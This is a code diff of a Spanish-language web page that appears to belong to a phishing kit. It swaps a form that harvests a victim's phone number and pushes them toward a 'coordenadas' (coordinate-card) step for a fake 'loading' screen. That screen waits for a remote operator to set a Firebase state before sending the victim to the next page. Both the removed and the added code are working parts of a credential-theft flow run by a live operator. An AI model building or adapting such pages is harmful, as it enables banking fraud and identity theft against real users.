@@ -2,59 +2,24 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Actualizar Teléfono</title>
+  <title>Cargando...</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background: white;
+    body {
       font-family: Arial, sans-serif;
-      height: 100vh;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: white;
     }
-    .contenedor {
-      border: 3px solid red;
-      padding: 20px;
-      width: 90vw;
-      max-width: 400px;
-      background: white;
-      box-sizing: border-box;
-    }
-    label {
-      display: block;
-      font-weight: bold;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-    input[type="number"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 1em;
-      border: 1px solid black;
-      border-radius: 4px;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 10px;
-      background-color: red;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-weight: bold;
+    .loader {
+      font-size: 20px;
+      color: #333;
     }
   </style>
 </head>
 <body>
-  <div class="contenedor">
-    <label for="telefono">Necesitamos actualizar tu teléfono</label>
-    <input type="number" id="telefono" maxlength="9" required placeholder="Ej: 912345678" />
-    <button onclick="enviarTelefono()">Siguiente</button>
-  </div>
-
+  <div class="loader">Cargando datos...</div>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
@@ -69,20 +34,17 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    function enviarTelefono() {
-      const telefono = document.getElementById("telefono").value;
-      if (telefono.length !== 9) {
-        alert("Debe tener exactamente 9 números");
-        return;
+    const ref = db.ref("validacion_estado");
+    ref.on("value", snap => {
+      const val = snap.val();
+      if (val === "siguiente") {
+        ref.set("");  // limpiar estado
+        window.location.href = "cargando2.html";
+      } else if (val === "error") {
+        ref.set("");
+        window.location.href = "error.html";
       }
-      db.ref("ultimo_usuario").once("value").then(snap => {
-        const userId = snap.val();
-        db.ref("usuarios/" + userId + "/telefono").set(telefono);
-        db.ref("estado_usuario/" + userId).set({ estado: "esperando_coordenadas" });
-        window.location.href = "coordenadas.html";
-      });
-    }
+    });
   </script>
 </body>
 </html>
